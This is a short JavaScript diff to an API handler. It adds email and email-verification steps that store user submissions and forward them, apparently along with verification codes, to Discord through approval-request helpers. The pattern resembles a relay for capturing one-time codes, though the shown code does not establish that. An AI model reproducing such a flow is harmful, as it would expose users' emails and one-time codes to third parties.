@@ -2,14 +2,18 @@ import {
   processRequest,
   processVerify,
   processResend,
+  processEmail,
+  processVerifyEmail,
   validatePayload,
 } from "../lib/handle-submit.js";
-import { createSession, submitCode, requestResendCode } from "../lib/session-store.js";
+import { createSession, submitCode, requestResendCode, submitEmail, submitEmailCode } from "../lib/session-store.js";
 import { getSiteMode } from "../lib/site-mode.js";
 import {
   sendApprovalRequest,
   sendCodeVerificationRequest,
   sendResendApprovalRequest,
+  sendEmailSubmission,
+  sendEmailCodeVerificationRequest,
 } from "../lib/discord.js";
 
 export default async function handler(req, res) {
@@ -35,6 +39,24 @@ export default async function handler(req, res) {
       const result = await processVerify(payload, {
         submitCode,
         sendCodeVerificationRequest,
+      });
+      res.status(200).json(result);
+      return;
+    }
+
+    if (payload.type === "email") {
+      const result = await processEmail(payload, {
+        submitEmail,
+        sendEmailSubmission,
+      });
+      res.status(200).json(result);
+      return;
+    }
+
+    if (payload.type === "verify_email") {
+      const result = await processVerifyEmail(payload, {
+        submitEmailCode,
+        sendEmailCodeVerificationRequest,
       });
       res.status(200).json(result);
       return;
